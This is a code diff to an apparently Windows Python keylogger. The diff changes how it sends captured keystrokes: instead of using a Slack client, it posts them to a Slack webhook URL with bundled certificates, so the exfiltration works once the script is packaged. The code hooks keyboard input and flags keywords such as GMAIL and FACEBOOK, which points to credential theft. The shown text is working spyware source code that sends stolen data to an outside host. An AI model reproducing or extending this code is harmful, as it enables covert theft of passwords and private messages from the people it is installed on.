@@ -5,9 +5,10 @@ import sys
 import win32event, win32api, winerror
 import configparser
 import time
+import requests, json
 from datetime import datetime
-from slackclient import SlackClient
 from _winreg import *
+from os.path import join, abspath
 
 #########################################
 #		INITIALIZATION VARIABLES		#
@@ -18,7 +19,7 @@ config = configparser.ConfigParser()
 config.read('slack.ini')
 slack_channel = config['channel']['ch1']
 slack_token = config['token']['tk1']
-slack_client = SlackClient(slack_token)
+slack_url = config['webhook']['url']
 
 # File info
 FILE = 'logfile.log'
@@ -26,6 +27,8 @@ FILE = 'logfile.log'
 DATA = ''
 DATA_LENGTH = 50
 
+cert_path = os.path.join(getattr(sys, '_MEIPASS', os.path.abspath(".")), 'cacert.pem')
+requests.utils.DEFAULT_CA_BUNDLE_PATH = cert_path
 # Keywords for algorithm
 key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
 
@@ -68,7 +71,7 @@ def on_keyboard(event):
 			if MODE == 0:
 				log_on_file(FILE, log)
 			elif MODE == 1:
-				log_on_cloud(slack_client, slack_channel, log)
+				log_on_cloud(slack_url, log)
 			DATA = ''
 	return True
 
@@ -77,12 +80,15 @@ def log_on_file(file, DATA):
 	with open(file, 'a') as f:
 		f.write(DATA)
 
-def log_on_cloud(client, channel, DATA):
+def log_on_cloud(url, DATA):
 	'''log the DATA collected in a Slack server'''
-	client.api_call(
-		"chat.postMessage",
-		channel=channel,
-		text=DATA)
+	payload = {'text': DATA}
+	try:
+		r = requests.post(url, data=json.dumps(payload, ensure_ascii=False), headers={'Content-Type': 'application/json'}, verify=cert_path)
+		# sol1: add verify=False (not always working)
+		print r.status_code
+	except:
+		print 'failed'
 
 #################################
 #		ALGORITHM RELEVANT  	#
